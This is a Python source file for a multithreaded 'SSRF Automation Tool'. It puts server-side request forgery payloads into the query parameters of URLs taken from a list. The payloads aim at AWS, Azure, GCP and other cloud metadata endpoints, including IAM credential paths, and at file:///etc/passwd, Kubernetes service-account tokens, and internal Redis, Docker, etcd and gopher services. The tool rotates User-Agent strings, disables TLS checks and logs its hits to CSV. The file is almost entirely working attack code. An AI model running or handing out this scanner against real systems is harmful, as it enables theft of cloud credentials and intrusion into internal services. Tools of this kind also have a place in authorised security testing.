import requests
import argparse
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode
import threading
import csv
import sys
import random
from colorama import Fore, Style, init
import re
import logging
import time

# Initialize colorama for colored console output
init(autoreset=True)

# Suppress only the single InsecureRequestWarning from urllib3 needed.
from urllib3.exceptions import InsecureRequestWarning
import urllib3
urllib3.disable_warnings(InsecureRequestWarning)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(message)s')

# List of User-Agent strings for random selection
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
]

# Define SSRF payloads with their corresponding grep keywords or regex patterns
ssrf_payloads_with_keywords = [
    # AWS Metadata Service
    {
        "payload": "http://169.254.169.254/latest/meta-data/",
        "keywords": [r"ami-id", r"instance-id", r"public-keys", r"local-ipv4", r"public-ipv4", r"meta-data"]
    },
    {
        "payload": "http://169.254.169.254/latest/user-data/",
        "keywords": [r"user-data", r"password", r"public-keys", r"ssh-rsa"]
    },
    {
        "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "keywords": [r"AccessKeyId", r"SecretAccessKey", r"Token"]
    },
    # Azure Metadata Service
    {
        "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "keywords": [r"compute", r"subscriptionId", r"vmId", r"tenantId"],
        "headers": {"Metadata": "true"}
    },
    # Google Cloud Metadata Service
    {
        "payload": "http://metadata.google.internal/computeMetadata/v1/",
        "keywords": [r"instance", r"hostname", r"project"],
        "headers": {"Metadata-Flavor": "Google"}
    },
    # Alibaba Cloud Metadata Service
    {
        "payload": "http://100.100.100.200/latest/meta-data/",
        "keywords": [r"InstanceId", r"ImageId", r"RegionId"]
    },
    # DigitalOcean Metadata Service
    {
        "payload": "http://169.254.169.254/metadata/v1/",
        "keywords": [r"hostname", r"vendor_data", r"public_keys"]
    },
    # Kubernetes API
    {
        "payload": "https://kubernetes.default.svc/",
        "keywords": [r"Unauthorized", r"forbidden", r"apiVersion"],
        "headers": {"Authorization": "Bearer "},
        "verify_ssl": False
    },
    # Localhost and Internal Services
    {
        "payload": "http://localhost/",
        "keywords": [r"localhost", r"welcome", r"it works"]
    },
    {
        "payload": "http://127.0.0.1/",
        "keywords": [r"localhost", r"welcome", r"it works"]
    },
    {
        "payload": "http://[::1]/",
        "keywords": [r"localhost", r"welcome", r"it works"]
    },
    {
        "payload": "http://192.168.0.1/",
        "keywords": [r"admin", r"router", r"login"]
    },
    {
        "payload": "http://10.0.0.1/",
        "keywords": [r"admin", r"router", r"login"]
    },
    # FTP Service
    {
        "payload": "ftp://127.0.0.1:21/",
        "keywords": [r"ftp", r"220", r"331"]
    },
    # File Protocol
    {
        "payload": "file:///etc/passwd",
        "keywords": [r"root:x:0:0", r"/bin/bash"]
    },
    {
        "payload": "file:///c:/Windows/System32/drivers/etc/hosts",
        "keywords": [r"127\.0\.0\.1", r"localhost"]
    },
    # SMB Service
    {
        "payload": "smb://127.0.0.1/share",
        "keywords": [r"smb", r"445", r"network"]
    },
    # Redis Service
    {
        "payload": "redis://localhost:6379/",
        "keywords": [r"redis_version", r"redis_mode"]
    },
    # Additional Internal Services
    {
        "payload": "http://localhost:6379/",
        "keywords": [r"redis_version", r"redis_mode"]
    },
    {
        "payload": "http://localhost:11211/",
        "keywords": [r"STAT", r"VERSION", r"END"]
    },
    {
        "payload": "http://localhost:27017/",
        "keywords": [r"MongoDB", r"db version"]
    },
    {
        "payload": "http://localhost:3306/",
        "keywords": [r"MySQL", r"5\.", r"MariaDB"]
    },
    {
        "payload": "http://localhost:8000/",
        "keywords": [r"development server", r"Django"]
    },
    {
        "payload": "http://localhost:8080/",
        "keywords": [r"Apache", r"Tomcat", r"Jetty"]
    },
    # Docker API
    {
        "payload": "http://localhost:2375/images/json",
        "keywords": [r"Id", r"Created", r"RepoTags"]
    },
    # Elasticsearch
    {
        "payload": "http://localhost:9200/_cat",
        "keywords": [r"health", r"indices", r"shards"]
    },
    # Jenkins
    {
        "payload": "http://localhost:8080/",
        "keywords": [r"Jenkins", r"Continuous Integration"]
    },
    # RabbitMQ
    {
        "payload": "http://localhost:15672/",
        "keywords": [r"RabbitMQ", r"Management"]
    },
    # CouchDB
    {
        "payload": "http://localhost:5984/_utils/",
        "keywords": [r"CouchDB", r"Welcome"]
    },
    # Kubernetes Service Account Token
    {
        "payload": "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
        "keywords": [r"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9"]  # Base64 JWT header
    },
    # EC2 Credentials
    {
        "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
        "keywords": [r"AccessKeyId", r"SecretAccessKey", r"Token"]
    },
    # etcd Keys
    {
        "payload": "http://127.0.0.1:2379/v2/keys/",
        "keywords": [r"etcd", r"key", r"value"]
    },
    # Gopher Protocol (for internal port scanning)
    {
        "payload": "gopher://127.0.0.1:11211/_stats",
        "keywords": [r"STAT", r"END"]
    },
    # SMTP Service
    {
        "payload": "smtp://localhost:25/",
        "keywords": [r"220", r"SMTP", r"ESMTP"]
    },
    # DNS over HTTP
    {
        "payload": "http://localhost:53/dns-query?name=localhost",
        "keywords": [r"DNS", r"Query", r"Answer"]
    },
]

# Initialize a lock for thread-safe operations
file_lock = threading.Lock()
print_lock = threading.Lock()

def compile_patterns(keywords):
    """
    Compile a list of regex patterns for efficient matching.
    Escapes patterns if they are invalid regex.
    """
    compiled = []
    for kw in keywords:
        try:
            compiled.append(re.compile(kw, re.IGNORECASE))
        except re.error:
            # If the pattern is invalid, treat it as a plain string
            compiled.append(re.compile(re.escape(kw), re.IGNORECASE))
    return compiled

# Pre-compile all regex patterns for efficiency
for payload_entry in ssrf_payloads_with_keywords:
    keywords = payload_entry["keywords"]
    payload_entry["compiled_keywords"] = compile_patterns(keywords)

def grep_response(response_text, compiled_keywords):
    """
    Search for any compiled regex patterns in the response text.
    Returns the matched pattern or "No match" if none found.
    """
    for pattern in compiled_keywords:
        if pattern.search(response_text):
            return pattern.pattern
    return "No match"

def send_request(session, url, param, payload, compiled_keywords, headers=None, timeout=10, verify_ssl=True):
    """
    Inject the payload into the specified parameter and send the HTTP request.
    Returns the new URL and the result of keyword matching.
    """
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    # Replace the target parameter with the SSRF payload
    query_params[param] = [payload]
    new_query = urlencode(query_params, doseq=True)
    new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    if new_query:
        new_url += f"?{new_query}"
    if parsed_url.fragment:
        new_url += f"#{parsed_url.fragment}"

    try:
        response = session.get(new_url, timeout=timeout, verify=verify_ssl, headers=headers)
        keyword_found = grep_response(response.text, compiled_keywords)
        return (new_url, keyword_found)
    except requests.RequestException as e:
        return (new_url, f"Error: {e}")

def process_url(session, url, ssrf_payloads, results, timeout, delay):
    """
    Process a single URL by injecting all SSRF payloads into its parameters.
    Appends matched results or errors to the results list.
    """
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    # Skip URLs without query parameters
    if not query_params:
        return

    # Iterate over each query parameter
    for param in query_params:
        # Iterate over each SSRF payload
        for payload_entry in ssrf_payloads:
            payload = payload_entry["payload"]
            compiled_keywords = payload_entry["compiled_keywords"]
            headers = payload_entry.get("headers", {})
            verify_ssl = payload_entry.get("verify_ssl", True)
            full_url, result = send_request(session, url, param, payload, compiled_keywords, headers=headers, timeout=timeout, verify_ssl=verify_ssl)
            
            # Determine if the result is a match or an error
            is_match = False
            detected_keyword = ""
            if result not in ["No match"] and not result.startswith("Error"):
                is_match = True
                detected_keyword = result
            elif result.startswith("Error"):
                is_match = False  # Errors are not considered matches

            # Log only if a keyword is detected
            if is_match:
                with file_lock:
                    # Extract the payload used from the new_url
                    parsed_new_url = urlparse(full_url)
                    new_query_params = parse_qs(parsed_new_url.query)
                    used_payload = new_query_params.get(param, [''])[0]
    
                    # Append matched results
                    results.append({
                        "Full URL": full_url,
                        "Keyword Detected": detected_keyword,
                        "Param": param,
                        "Payload": used_payload,
                        "Result": result
                    })
    
                # Determine color based on the result
                color = Fore.GREEN
                status = "Found"

                # Prepare the detailed colored output
                output_lines = [
                    f"{color}[{status}] URL: {full_url}",
                    f"{color}Keyword Detected: {detected_keyword}",
                    f"Parameter: {param}",
                    f"Payload Used: {payload}",
                    "-" * 80
                ]
    
                # Print the output with thread-safe printing
                with print_lock:
                    for line in output_lines:
                        print(line)

            # Delay between requests
            if delay > 0:
                time.sleep(delay)

def worker(urls, ssrf_payloads, results, timeout, delay):
    """
    Worker function for each thread to process a list of URLs.
    """
    with requests.Session() as session:
        # Customize session headers
        session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        for url in urls:
            url = url.strip()
            if url:
                process_url(session, url, ssrf_payloads, results, timeout, delay)

def main():
    """
    Main function to parse arguments, initiate multithreading, and handle output.
    """
    parser = argparse.ArgumentParser(description="SSRF Automation Tool")
    parser.add_argument('-i', '--input', required=True, help="Input file containing URLs")
    parser.add_argument('-o', '--output', required=True, help="Output CSV file to store results")
    parser.add_argument('-t', '--threads', type=int, default=10, help="Number of threads (optional)")
    parser.add_argument('--timeout', type=int, default=10, help="Request timeout in seconds (optional)")
    parser.add_argument('--delay', type=float, default=0, help="Delay between requests in seconds (optional)")

    args = parser.parse_args()

    # Read URLs from input file
    try:
        with open(args.input, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Input file '{args.input}' not found.")
        sys.exit(1)

    total_urls = len(urls)
    print(f"Total URLs to process: {total_urls}")
    if total_urls == 0:
        print(f"{Fore.YELLOW}No URLs to process.")
        sys.exit(0)

    # Prepare for multithreading
    thread_count = min(args.threads, total_urls)
    chunk_size = (total_urls + thread_count - 1) // thread_count
    url_chunks = [urls[i*chunk_size:(i+1)*chunk_size] for i in range(thread_count)]

    # Shared list to collect results
    results = []

    # Using ThreadPoolExecutor for better thread management
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = []
        for chunk in url_chunks:
            futures.append(executor.submit(worker, chunk, ssrf_payloads_with_keywords, results, args.timeout, args.delay))

        # Handle completed futures
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"{Fore.YELLOW}An error occurred in a thread: {e}")

    # Write matched results to the output CSV file
    with file_lock:
        try:
            with open(args.output, 'w', newline='', encoding='utf-8') as csvfile:
                fieldnames = ["Full URL", "Keyword Detected", "Param", "Payload", "Result"]
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                writer.writeheader()
                for entry in results:
                    writer.writerow(entry)
            print(f"\n{Fore.CYAN}Results have been written to '{args.output}'.")
        except IOError as e:
            print(f"{Fore.RED}Failed to write to output file '{args.output}': {e}")
            sys.exit(1)

if __name__ == "__main__":
    main()
